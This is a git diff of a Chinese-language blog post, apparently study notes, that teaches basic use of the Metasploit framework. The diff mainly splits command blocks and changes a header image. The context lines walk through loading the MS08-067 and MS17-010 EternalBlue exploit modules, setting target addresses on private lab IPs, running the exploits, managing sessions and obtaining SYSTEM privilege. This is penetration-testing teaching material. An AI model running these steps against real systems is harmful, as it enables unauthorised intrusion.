@@ -4,7 +4,7 @@ title:      Metasploit渗透测试框架的基本使用
 subtitle:  学习笔记
 date:       2023-4-8
 author:     Draper-crypto
-header-img: img/blogimg/post-Java-alibaba.jpg
+header-img: img/blogimg/post-bg-hacker.jpg
 catalog: true
 tags:
     - Metasploit
@@ -56,6 +56,8 @@ Metasploit程序需要使用PostgreSQL数据库。
 
 ```powershell
 root@kali:~# systemctl start postgresql
+```
+```powershell
 root@kali:~# systemctl enable postgresql         #设置成开机启动数据库
 ```
 
@@ -99,7 +101,11 @@ msf5 > connect 192.168.1.1 80       #192.168.1.1是 IP 地址，80 是端口号�
 
 ```powershell
 msf5 > show exploits            #列出 metasploit 框架中的所有渗透攻击模块。
+```
+```powershell
 msf5 > show payloads            #列出 metasploit 框架中的所有攻击载荷。 
+```
+```powershell
 msf5 > show auxiliary           #列出 metasploit 框架中的所有辅助攻击载荷。
 ```
 
@@ -111,9 +117,17 @@ msf5 > show auxiliary           #列出 metasploit 框架中的所有辅助攻�
 
 ```powershell
 msf5 > search [options] <keywords>      #search后主要加选项和关键字
+```
+```powershell
 msf5 > search Keywords（参数）:关键字
+```
+```powershell
 msf5 > search platform（平台）:mysql        #查询的结果会列出 rank 比较高的模块
+```
+```powershell
 msf5 > search type（类型）:特定类型的模块
+```
+```powershell
 msf5 > search name:mysql type:exploit   #联合查找，多条件组合
 ```
 
@@ -176,6 +190,8 @@ msf5 exploit(windows/smb/ms08_067_netapi) > back
 ```powershell
 方法1：info <模块名称>
 例：msf5 > info exploit/windows/smb/ms08_067_netapi 
+```
+```powershell
 方法2：use 装载模块后直接使用info
 例：msf5 > use exploit/windows/smb/ms08_067_netapi
 ```
@@ -204,8 +220,14 @@ show命令可以查看模块的相关信息
 
 ```powershell
 msf5 exploit(windows/smb/ms08_067_netapi) > show options    #查看模块的选项
+```
+```powershell
 msf5 exploit(windows/smb/ms08_067_netapi) > show targets    #查看可以攻击哪些操作系统
+```
+```powershell
 msf5 exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.1.54  #设置攻击地址参数
+```
+```powershell
 msf5 exploit(windows/smb/ms08_067_netapi) > show options        #查看设置的值
 ```
 
@@ -215,9 +237,17 @@ msf5 exploit(windows/smb/ms08_067_netapi) > show options        #查看设置的
 
 ```powershell
 msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit -j     #-j 表示后台执行,渗透目标完成后会创建一个 session 我们可以通过 session 连接目标主机。
+```
+```powershell
 msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions   #查看会话详细信息
+```
+```powershell
 msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 4      #通过会话 Id 进入会话
+```
+```powershell
 C:\Windows\system32>background      #退出会话将会话保存到后台
+```
+```powershell
 msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions -k 4      #根据会话 Id 结束会话
 ```
 
@@ -291,6 +321,8 @@ msf5 auxiliary(scanner/smb/smb_ms17_010) > run
 
 ```powershell
 msf5 auxiliary(scanner/smb/smb_ms17_010) > back
+```
+```powershell
 msf5 > search ms17-010
 ```
 
@@ -300,6 +332,8 @@ msf5 > search ms17-010
 
 ```powershell
 msf5 > use exploit/windows/smb/ms17_010_eternalblue
+```
+```powershell
 msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
 ```
 
@@ -309,6 +343,8 @@ msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
 
 ```powershell
 msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.2.173
+```
+```powershell
 msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
 ```
 
@@ -384,7 +420,8 @@ msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.2.16
 
 ![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320629.webp)
 
-成功创建admin用
+成功创建admin用<br>
+
 **（3）通过whoami查看当前用户级别，可以发现我们获取到了最高权限system**
 
 ![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320623.webp)
